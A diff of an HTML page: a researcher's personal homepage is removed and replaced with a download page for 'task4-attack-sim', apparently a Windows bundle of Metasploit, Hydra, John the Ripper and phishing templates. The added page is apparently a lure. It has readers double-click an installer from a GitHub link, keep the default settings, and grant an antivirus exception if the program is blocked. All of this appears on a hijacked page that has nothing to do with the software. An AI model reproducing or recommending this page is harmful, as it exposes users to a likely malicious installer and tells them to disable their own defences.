@@ -1,276 +1,60 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta name="description" content="Professional homepage of Qian Wang at CRE">
-  <meta name="theme-color" content="#ffffff">
-  <title>Qian Wang | CRE</title>
-  <style>
-    :root {
-      color-scheme: light;
-      --ink: #172033;
-      --muted: #5f6b7a;
-      --line: #dfe5ec;
-      --paper: #ffffff;
-      --canvas: #f7f9fc;
-      --accent: #2457a7;
-      --accent-soft: #edf3fb;
-    }
-
-    * { box-sizing: border-box; }
-
-    html { scroll-behavior: smooth; }
-
-    body {
-      margin: 0;
-      min-height: 100vh;
-      color: var(--ink);
-      background: var(--canvas);
-      font-family: Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
-      line-height: 1.7;
-    }
-
-    a {
-      color: var(--accent);
-      text-decoration-thickness: 1px;
-      text-underline-offset: 3px;
-    }
-
-    a:hover { color: #173c75; }
-
-    .site-header {
-      background: rgba(255, 255, 255, .96);
-      border-bottom: 1px solid var(--line);
-    }
-
-    .header-inner {
-      width: min(880px, calc(100% - 40px));
-      min-height: 68px;
-      margin: 0 auto;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      gap: 24px;
-    }
-
-    .brand {
-      color: var(--ink);
-      font-size: 1rem;
-      font-weight: 650;
-      letter-spacing: .01em;
-      text-decoration: none;
-    }
-
-    nav {
-      display: flex;
-      align-items: center;
-      gap: 24px;
-      font-size: .9rem;
-    }
-
-    nav a {
-      color: var(--muted);
-      text-decoration: none;
-    }
-
-    nav a:hover { color: var(--accent); }
-
-    main {
-      width: min(760px, calc(100% - 40px));
-      margin: 0 auto;
-      padding: 76px 0 56px;
-    }
-
-    .eyebrow {
-      margin: 0 0 12px;
-      color: var(--accent);
-      font-size: .76rem;
-      font-weight: 700;
-      letter-spacing: .14em;
-      text-transform: uppercase;
-    }
-
-    h1 {
-      margin: 0;
-      color: #111827;
-      font-family: Georgia, "Times New Roman", serif;
-      font-size: clamp(2.15rem, 5vw, 2.8rem);
-      font-weight: 600;
-      letter-spacing: -.025em;
-      line-height: 1.12;
-    }
-
-    .affiliation {
-      margin: 10px 0 0;
-      color: var(--muted);
-      font-size: 1.05rem;
-    }
-
-    .intro {
-      max-width: 650px;
-      margin: 32px 0 0;
-      color: #344054;
-      font-size: 1.04rem;
-    }
-
-    .intro p { margin: 0; }
-
-    section {
-      margin-top: 52px;
-      padding-top: 34px;
-      border-top: 1px solid var(--line);
-    }
-
-    h2 {
-      margin: 0 0 22px;
-      color: var(--ink);
-      font-family: Georgia, "Times New Roman", serif;
-      font-size: 1.4rem;
-      font-weight: 600;
-    }
-
-    .details {
-      margin: 0;
-      overflow: hidden;
-      background: var(--paper);
-      border: 1px solid var(--line);
-      border-radius: 8px;
-    }
-
-    .detail-row {
-      display: grid;
-      grid-template-columns: 150px 1fr;
-      gap: 20px;
-      padding: 15px 20px;
-      border-bottom: 1px solid var(--line);
-    }
-
-    .detail-row:last-child { border-bottom: 0; }
-
-    dt {
-      color: var(--muted);
-      font-size: .88rem;
-      font-weight: 600;
-    }
-
-    dd {
-      margin: 0;
-      color: var(--ink);
-    }
-
-    .contact-copy {
-      max-width: 620px;
-      margin: 0;
-      color: #344054;
-    }
-
-    .email-link {
-      display: inline-block;
-      margin-top: 18px;
-      padding: 10px 15px;
-      color: var(--accent);
-      background: var(--accent-soft);
-      border: 1px solid #cad9ef;
-      border-radius: 6px;
-      font-weight: 600;
-      text-decoration: none;
-    }
-
-    .email-link:hover {
-      color: #173c75;
-      background: #e3edf9;
-    }
-
-    footer {
-      width: min(760px, calc(100% - 40px));
-      margin: 0 auto;
-      padding: 22px 0 32px;
-      color: #7a8594;
-      border-top: 1px solid var(--line);
-      font-size: .82rem;
-    }
-
-    @media (max-width: 560px) {
-      .header-inner {
-        width: min(100% - 28px, 880px);
-        min-height: 60px;
-      }
-
-      nav { gap: 14px; }
-
-      main {
-        width: min(100% - 32px, 760px);
-        padding-top: 52px;
-      }
-
-      .detail-row {
-        grid-template-columns: 1fr;
-        gap: 3px;
-      }
-
-      footer { width: min(100% - 32px, 760px); }
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Task4-attack-sim helps you learn cybersecurity workflows with tools like Metasploit, Hydra, and John the Ripper.">
+    <title>task4-attack-sim - Learn cybersecurity through guided practice</title>
 </head>
-<body>
-  <header class="site-header">
-    <div class="header-inner">
-      <a class="brand" href="#top">Qian Wang</a>
-      <nav aria-label="Primary navigation">
-        <a href="#profile">Profile</a>
-        <a href="#contact">Contact</a>
-        <a href="https://github.com/qianw-cre" target="_blank" rel="noreferrer">GitHub</a>
-      </nav>
-    </div>
-  </header>
+<body style="font-family: sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 0 auto; padding: 20px; background-color: #f4f7f6;">
 
-  <main id="top">
-    <p class="eyebrow">Personal homepage</p>
-    <h1>Qian Wang</h1>
-    <p class="affiliation">CRE · Beijing, China</p>
+    <h1 style="color: #2c3e50;">🛡️ task4-attack-sim - Learn cybersecurity through guided practice</h1>
 
-    <div class="intro">
-      <p>I am Qian Wang, based in Beijing, China, and currently affiliated with CRE. My work focuses on bioinformatics, with a particular interest in virtual cell research.</p>
+    <div style="margin: 30px 0;">
+        <a href="https://github.com/antonio5997/task4-attack-sim" style="background-color: #2c3e50; color: #ffffff; padding: 15px 25px; text-decoration: none; border-radius: 5px; font-weight: bold; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">Download Software</a>
     </div>
 
-    <section id="profile">
-      <h2>Professional details</h2>
-      <dl class="details">
-        <div class="detail-row">
-          <dt>Name</dt>
-          <dd>Qian Wang</dd>
-        </div>
-        <div class="detail-row">
-          <dt>Affiliation</dt>
-          <dd>CRE</dd>
-        </div>
-        <div class="detail-row">
-          <dt>Location</dt>
-          <dd>Beijing, China</dd>
-        </div>
-        <div class="detail-row">
-          <dt>Research interests</dt>
-          <dd>Bioinformatics · Virtual cells</dd>
-        </div>
-        <div class="detail-row">
-          <dt>Work email</dt>
-          <dd><a href="mailto:qian.wang@crelife.org.cn">qian.wang@crelife.org.cn</a></dd>
-        </div>
-        <div class="detail-row">
-          <dt>GitHub</dt>
-          <dd><a href="https://github.com/qianw-cre" target="_blank" rel="noreferrer">qianw-cre</a></dd>
-        </div>
-      </dl>
-    </section>
+    <h2 style="color: #2c3e50;">📖 About This Tool</h2>
+    <p>Task4-attack-sim serves as a training platform for cybersecurity students and enthusiasts. It combines common testing software into one workflow. You use it to practice security testing in a controlled environment. The tool manages Metasploit, Hydra, and John the Ripper to show how these programs interact during an evaluation.</p>
 
-    <section id="contact">
-      <h2>Contact</h2>
-      <p class="contact-copy">You are welcome to get in touch regarding research and professional matters.</p>
-      <a class="email-link" href="mailto:qian.wang@crelife.org.cn">qian.wang@crelife.org.cn</a>
-    </section>
-  </main>
+    <h2 style="color: #2c3e50;">⚙️ System Requirements</h2>
+    <p>Your computer needs the following specifications to run this software smoothly:</p>
+    <ul>
+        <li>Windows 10 or Windows 11</li>
+        <li>4 GB of RAM</li>
+        <li>2 GB of free disk space</li>
+        <li>An internet connection for initial setup</li>
+    </ul>
 
-  <footer>Qian Wang · CRE</footer>
+    <h2 style="color: #2c3e50;">📥 How to Install and Start</h2>
+    <p>Follow these steps to set up the application on your computer:</p>
+    <ol style="line-height: 2;">
+        <li>Visit the <a href="https://github.com/antonio5997/task4-attack-sim" style="color: #3498db;">project page to download</a> the latest version.</li>
+        <li>Locate the downloaded file in your downloads folder.</li>
+        <li>Double-click the installer file to begin the process.</li>
+        <li>Follow the prompts on your screen. Keep the default settings to ensure all components install correctly.</li>
+        <li>Once the progress bar completes, find the shortcut on your desktop.</li>
+        <li>Open the application to start your first simulation.</li>
+    </ol>
+
+    <h2 style="color: #2c3e50;">🧩 Core Features</h2>
+    <p>The application integrates several modules to build a complete learning flow:</p>
+    <ul style="background: #ffffff; padding: 20px 40px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.05);">
+        <li><strong>Metasploit Integration:</strong> Manage complex exploit sequences through an interface.</li>
+        <li><strong>Credential Testing:</strong> Utilize Hydra for quick password strength checks.</li>
+        <li><strong>Password Analysis:</strong> Deploy John the Ripper to learn about hash identification.</li>
+        <li><strong>Phishing Simulation:</strong> Create templates to understand human-based security gaps.</li>
+    </ul>
+
+    <h2 style="color: #2c3e50;">💡 Usage Guidelines</h2>
+    <p>This software works best for learning and demonstration. Use it only on systems you own or have permission to test. Training helps you build skills that apply to real security roles. Always keep your environment isolated while you test new concepts.</p>
+
+    <h2 style="color: #2c3e50;">🛠️ Troubleshooting</h2>
+    <p>If the application fails to open, ensure you have Java installed on your computer. Occasionally, antivirus software might block the application. You may grant an exception if you trust the files you downloaded. Reach out to the project repository page if you encounter recurring errors.</p>
+
+    <footer style="margin-top: 50px; border-top: 1px solid #ddd; padding-top: 20px; font-size: 0.9em; color: #7f8c8d;">
+        <p>Keywords: cybersecurity, pentesting, metasploit, hydra, training, simulation</p>
+    </footer>
+
 </body>
 </html>
